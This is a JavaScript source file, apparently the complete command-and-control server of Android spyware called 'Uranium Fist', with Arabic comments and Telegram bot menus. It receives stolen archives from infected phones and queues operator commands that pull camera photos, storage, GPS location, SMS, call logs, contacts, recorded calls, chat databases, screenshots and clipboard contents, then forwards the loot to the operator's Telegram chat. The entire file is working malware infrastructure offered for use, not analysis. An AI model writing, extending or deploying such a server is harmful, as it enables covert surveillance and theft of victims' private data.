// server_uranium_v7_7_controller.js - Uranium Fist Controlling Server Core v7.7
require('dotenv').config();
const express = require('express');
const telegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();

const token = process.env.TG_TOKEN;
const chatId = process.env.TG_ID;

if (!token || !chatId) {
    console.error('[-] Critical Error: Telegram credentials missing.');
    process.exit(1);
}

// مجلد التخزين المركزي على الجهاز المتحكم (Controlling Device Storage Vault)
const STORAGE_DIR = path.join(__dirname, 'uranium_storage');
if (!fs.existsSync(STORAGE_DIR)) fs.mkdirSync(STORAGE_DIR, { recursive: true });

const db = new sqlite3.Database('./uranium_core_v7_7.db');
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS nodes (id TEXT PRIMARY KEY, model TEXT, last_seen INTEGER)`);
    db.run(`CREATE TABLE IF NOT EXISTS tasks (id INTEGER PRIMARY KEY AUTOINCREMENT, node_id TEXT, action TEXT, payload TEXT, status TEXT)`);
});

const app = express();
const appBot = new telegramBot(token, { polling: true });

appBot.on('polling_error', (error) => {
    if (error.code !== 'ETELEGRAM' || error.message.indexOf('409 Conflict') === -1) {
        console.log(`[Telegram Polling Warning]: ${error.code} - ${error.message}`);
    }
});

app.use(express.text({ type: 'application/json', limit: '2048mb' }));
app.use(express.raw({ type: 'application/octet-stream', limit: '5000mb' }));

async function sendTg(msg, options = {}) {
    try {
        return await appBot.sendMessage(chatId, msg, { parse_mode: 'HTML', ...options });
    } catch (e) {
        console.error('TG Error:', e.message);
    }
}

app.get('/', (req, res) => {
    res.status(200).send(`<html><body style="background:#000;color:#00ff66;font-family:monospace;text-align:center;padding-top:50px;"><h1>[☢️] URANIUM CONTROLLING SERVER v7.7 ONLINE [☢️]</h1></body></html>`);
});

// استقبال وحفظ الملفات والأرشيفات مباشرة في الجهاز المتحكم
app.post('/api/v3/uranium/upload_raw', async (req, res) => {
    try {
        const nodeId = req.headers['x-node-id'] || 'unknown';
        const nodeModel = req.headers['x-node-model'] || 'Unknown';
        const fileName = req.headers['x-file-name'] || `uranium_archive_${Date.now()}.zip`;

        db.run(`INSERT OR REPLACE INTO nodes (id, model, last_seen) VALUES (?, ?, ?)`, [nodeId, nodeModel, Date.now()]);

        if (!req.body || !Buffer.isBuffer(req.body)) {
            return res.status(400).json({ status: 'BAD_BINARY_PAYLOAD' });
        }

        const safeName = path.basename(fileName);
        const controllerFilePath = path.join(STORAGE_DIR, `${nodeId}_${Date.now()}_${safeName}`);
        
        // الحفظ الفولاذي المباشر داخل الجهاز المتحكم
        fs.writeFileSync(controllerFilePath, req.body);

        const stats = fs.statSync(controllerFilePath);
        const fileSizeMB = stats.size / (1024 * 1024);

        console.log(`[+] SUCCESS: File securely saved on controlling device -> ${controllerFilePath} (${fileSizeMB.toFixed(2)} MB)`);

        // محاولة إرسال الملف إلى التيليجرام؛ وإذا فشل أو كبر الحجم، يتم الاكتفاء بحفظه على الجهاز المتحكم وإعلامك
        try {
            if (fileSizeMB <= 45) {
                await appBot.sendDocument(chatId, controllerFilePath, { 
                    caption: `☢️ <b>حصاد ملكي جديد مخزن على جهازك المتحكم:</b>\n📱 العقدة: <code>${nodeId}</code>\n📂 <code>${safeName}</code> (${fileSizeMB.toFixed(2)} MB)` 
                });
            } else {
                throw new Error('File too large for Telegram');
            }
        } catch (tgErr) {
            await sendTg(`⚠️ <b>تم الحفظ في وحدة تخزين جهازك المتحكم بنجاح:</b>\n📂 المسار: <code>uranium_storage/${path.basename(controllerFilePath)}</code>\n📊 الحجم: <b>${fileSizeMB.toFixed(2)} MB</b>\n(الملف بحوزتك محلياً بالكامل نظراً لقيود التيليجرام).`);
        }

        res.status(200).json({ status: 'OK', message: 'SAVED_ON_CONTROLLER' });
    } catch (e) {
        console.error('Upload Error:', e);
        res.status(500).json({ status: 'SERVER_ERROR', message: e.message });
    }
});

app.post('/api/v3/uranium/stream', async (req, res) => {
    try {
        const nodeId = req.headers['x-node-id'] || 'unknown';
        const nodeModel = req.headers['x-node-model'] || 'Unknown';

        db.run(`INSERT OR REPLACE INTO nodes (id, model, last_seen) VALUES (?, ?, ?)`, [nodeId, nodeModel, Date.now()]);
        
        let payload;
        try {
            payload = JSON.parse(req.body);
        } catch (err) {
            return res.status(400).json({ status: 'BAD_PAYLOAD', error: err.message });
        }

        let directive = { status: 'ACK', task: null };

        if (payload.type === 'TEXT_REPORT') {
            const textData = payload.data || '';
            if (textData.length > 5) {
                await sendTg(`☢️ <b>تقرير العقدة [<code>${nodeId}</code>]:</b>\n<pre>${textData.substring(0, 3800)}</pre>`);
            }
        }

        db.get(`SELECT * FROM tasks WHERE node_id = ? AND status = 'PENDING' LIMIT 1`, [nodeId], (err, row) => {
            if (row) {
                directive.task = { id: row.id, action: row.action, payload: JSON.parse(row.payload || '{}') };
                db.run(`UPDATE tasks SET status = 'SENT' WHERE id = ?`, [row.id]);
            }
            res.status(200).json(directive);
        });
    } catch (e) {
        res.status(500).json({ status: 'SERVER_ERROR', message: e.message });
    }
});

appBot.on('message', async (msg) => {
    if (String(msg.chat.id) !== String(chatId)) return;
    const text = msg.text;

    if (text === '/start') {
        db.all(`SELECT id, model, last_seen FROM nodes`, async (err, rows) => {
            if (!rows || rows.length === 0) {
                await sendTg(`⚠️ <b>لا توجد عقد يورانيوم متصلة حالياً.</b>`);
                return;
            }

            let inlineKeyboard = [];
            rows.forEach(node => {
                inlineKeyboard.push([{ text: `☢️ ${node.model} (${node.id.substring(0, 6)})`, callback_data: `menu_${node.id}` }]);
            });

            await sendTg(`☢️️ <b>غرفة قيادة قبضة اليورانيوم المطلقة v7.7:</b>\nاختر العقدة للسيطرة التامة:`, {
                reply_markup: { inline_keyboard: inlineKeyboard }
            });
        });
    }
});

appBot.on('callback_query', async (query) => {
    const data = query.data;
    const msg = query.message;

    if (data.startsWith('menu_')) {
        const nodeId = data.replace('menu_', '');
        const keyboard = {
            inline_keyboard: [
                [
                    { text: '☢️ الحصاد الشامل الكاميرا DCIM', callback_data: `cmd_EXTRACT_CAMERA_ZIP_${nodeId}` },
                    { text: '📥 التخزين الضخم Download (10GB+)', callback_data: `cmd_EXTRACT_STORAGE_ZIP_${nodeId}` }
                ],
                [
                    { text: '📍 تحديد الموقع بدقة خارقة (GPS)', callback_data: `cmd_EXTRACT_LOCATION_${nodeId}` },
                    { text: '📱 قائمة التطبيقات المثبتة كاملة', callback_data: `cmd_EXTRACT_APPS_${nodeId}` }
                ],
                [
                    { text: '📨 الرسائل الواردة (SMS)', callback_data: `cmd_EXTRACT_SMS_${nodeId}` },
                    { text: '📞 سجل المكالمات التفصيلي', callback_data: `cmd_EXTRACT_CALLS_${nodeId}` }
                ],
                [
                    { text: '📇 دليل جهات الاتصال', callback_data: `cmd_EXTRACT_CONTACTS_${nodeId}` },
                    { text: '📸 أحدث صورة فورية (Stealth)', callback_data: `cmd_EXTRACT_PHOTOS_${nodeId}` }
                ],
                [
                    { text: '🎤 سحب التسجيلات الصوتية', callback_data: `cmd_EXTRACT_AUDIO_${nodeId}` },
                    { text: '📂 سحب مستندات الذاكرة الداخلية', callback_data: `cmd_EXTRACT_DOCS_${nodeId}` }
                ],
                [
                    { text: '📞 سحب المكالمات المسجلة', callback_data: `cmd_EXTRACT_AUDIO_CALLS_${nodeId}` },
                    { text: '💬 قواعد بيانات الدردشة', callback_data: `cmd_EXTRACT_CHAT_DBS_${nodeId}` }
                ],
                [
                    { text: '🖼️ لقطات الشاشة الحية', callback_data: `cmd_EXTRACT_SCREENSHOT_ZIP_${nodeId}` },
                    { text: '📋 سحب الحافظة (Clipboard)', callback_data: `cmd_EXTRACT_CLIPBOARD_${nodeId}` }
                ],
                [{ text: '🔙 القائمة الرئيسية', callback_data: 'back_home' }]
            ]
        };
        await appBot.editMessageText(`🎯 <b>العقدة تحت السيطرة المطلقة:</b> <code>${nodeId}</code>`, {
            chat_id: msg.chat.id,
            message_id: msg.message_id,
            parse_mode: 'HTML',
            reply_markup: keyboard
        });
    } else if (data.startsWith('cmd_')) {
        const parts = data.split('_');
        const targetNodeId = parts.pop();
        const action = parts.slice(1).join('_');

        db.run(`INSERT INTO tasks (node_id, action, payload, status) VALUES (?, ?, '{}', 'PENDING')`, [targetNodeId, action], async () => {
            await appBot.answerCallbackQuery(query.id, { text: `☢️ تم إطلاق الأمر [${action}] بنجاح!` });
            await sendTg(`⚡ <b>أمر سيطرة [<code>${action}</code>] قيد التنفيذ للعقدة <code>${targetNodeId}</code>...</b>`);
        });
    } else if (data === 'back_home') {
        await appBot.deleteMessage(msg.chat.id, msg.message_id);
        await sendTg(`أرسل <code>/start</code> لإظهار قائمة عقد اليورانيوم النشطة.`);
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`[+] Uranium Controlling Server Online on port ${PORT}`));
